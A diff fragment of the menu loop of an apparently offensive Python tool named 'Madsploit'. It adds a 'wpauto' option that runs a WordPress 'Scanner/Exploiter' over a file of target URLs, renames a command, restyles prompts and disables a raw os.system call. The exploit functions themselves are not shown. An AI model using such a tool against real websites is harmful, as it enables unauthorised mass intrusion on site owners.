+        userinput = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Input {PURPLE}=>{PURPLE} {PURPLE}{RESET}")
+        #userinput = input(f"{RESET}{user}{YELLOW}@{CYAN}{host_name}:{RED}~{CYAN}/{foldername}{RED}$ {RESET}")
         #tmp = sp.call('clear', shell=True)
     except (KeyboardInterrupt, SystemExit):
         print(f"\n{c}Leaving {Y}Madsploit... {w}")
@@ -871,7 +925,7 @@ def main():
         xhelp()
     elif userinput == "help":
         xhelp()
-    elif userinput == "mailman":
+    elif userinput == "port":
         mailman()
     elif userinput == "wpversion":
         url = input(f"Site{RED}: {RESET}")
@@ -881,27 +935,47 @@ def main():
         url = input(f"Site{RED}: {RESET}")
         wp_themes(url)
         return main()
+
+    elif userinput == "wpauto":
+        print(f" \n {PURPLE}[ {GREEN}${PURPLE} ] {RESET}Wordpress Scanner/Exploiter")
+        file_name = input(f" \n {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Targets {PURPLE}=>{RESET} ")
+        try:
+            
+            with open(file_name, 'r') as f:
+                buf = f.readlines()
+                if buf[-1] == '\n':
+                    buf = buf[:-1]
+                urls = [x[:-1] for x in buf]
+                for url in urls:
+                    auto(url)
+        except:
+            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not open {RED}{file_name}!\n")
+            return main()
+        
     elif userinput == "wpscan":
-        print(f"\n{YELLOW}[ {RED}~ {RESET}Wordpress Scanner/exploiter  {RED}~ {YELLOW}] {RESET}\n")
-        url = input(f"Target{RED}: {RESET}")
+        print(f"\n {PURPLE}[ {GREEN}~ {RESET}Wordpress Scanner/exploiter  {GREEN}~ {PURPLE}] {RESET}\n")
+        url = input(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Target{PURPLE} => {RESET}")
         init_time = time.time()
         
         auto(url)
         end_time = time.time()
         elapsed_time = end_time - init_time
-        print('%s[%s Elapsed Time %s]%s => %.2f seconds \n' % (YELLOW,RESET,YELLOW,RESET,elapsed_time))
+        print(f"\n {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Elapsed Time {PURPLE}=>{RESET}"+' %.2f seconds ' % (elapsed_time)+"\n")
         return main()
 
     if userinput == "cls":
-        os.system("cls;clear")
         
+        os.system("cls;clear")
+        banner()
         return main()
 
     try:
-        os.system(f"{userinput}")
+        pass
+        #os.system(f"{userinput}")
     except (KeyboardInterrupt, SystemExit):
         print("EXIT")  
-    except:
+    except Exception as e:
+        print(e)
         return main()
     return main()
 main()
